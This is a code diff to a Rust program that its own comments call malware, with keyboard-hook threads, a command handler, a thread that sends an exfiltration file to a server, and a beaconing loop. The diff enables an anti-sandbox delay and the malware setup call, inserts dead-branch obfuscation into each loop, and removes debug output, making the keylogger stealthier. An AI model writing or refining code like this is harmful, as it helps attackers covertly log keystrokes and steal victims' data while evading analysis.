@@ -47,9 +47,9 @@ macro_rules! dead_branches {
 #[tokio::main]
 async fn main() {
 
-    // //anti sandbox
-    // // sleep(Duration::from_secs(600)).await;
-    //setup_malware();
+    //anti sandbox
+    sleep(Duration::from_secs(600)).await;
+    setup_malware();
     check_for_analysis_behaviour();
 
     const URL: &'static str = "http://127.0.0.1:5000";
@@ -95,7 +95,7 @@ iwIDAQAB
     //thread that handels keyboard hooks
     tokio::spawn(async move {
         loop {
-
+            dead_branches!("AHHH", "HAHH");
              //sleeps the malware for a predefined time
             //used by the malware author to sleep
             if paused_hook.load(Ordering::Relaxed) {
@@ -118,7 +118,7 @@ iwIDAQAB
         //create ranom number generator
         let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
         loop {
-
+            dead_branches!("AHHH", "HAHH");
             //sleeps the malware for a predefined time
             //used by the malware author to sleep
             if paused_command.load(Ordering::Relaxed) {
@@ -141,6 +141,7 @@ iwIDAQAB
     //thread that reads exfill file, and sends it off to the server
     tokio::spawn(async move {
         loop {
+            dead_branches!("AHHH", "HAHH");
             //create ranom number generator
             let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
 
@@ -178,7 +179,7 @@ iwIDAQAB
 
     // Main loop for beaconing
     loop {
-
+        dead_branches!("AHHH", "HAHH");
         //sleeps the malware for a predefined time
         //used by the malware author to sleep
         if paused.load(Ordering::Relaxed) {
@@ -219,11 +220,8 @@ async fn execute_command(cmd: &str, paused: Arc<AtomicBool>) {
         "slp" => {
             
             if let Ok(secs) = cmds[1].replace('\n', "").parse() {
-                println!("[Debugging]: Sleeping all background threads for {} seconds", secs);
                 paused.store(true, Ordering::Relaxed);
                 sleep(Duration::from_secs(secs)).await;
-                paused.store(false, Ordering::Relaxed);
-                print!("[Debugging]: Waked up now")
             }
         }
         //if it's shd shut down the malware
@@ -233,7 +231,6 @@ async fn execute_command(cmd: &str, paused: Arc<AtomicBool>) {
 
         //if it's pwn print
         "pwn" => {
-            println!("{}", cmds[1]);
             println!("{}", cmds[1]);
         }
         _ => {}
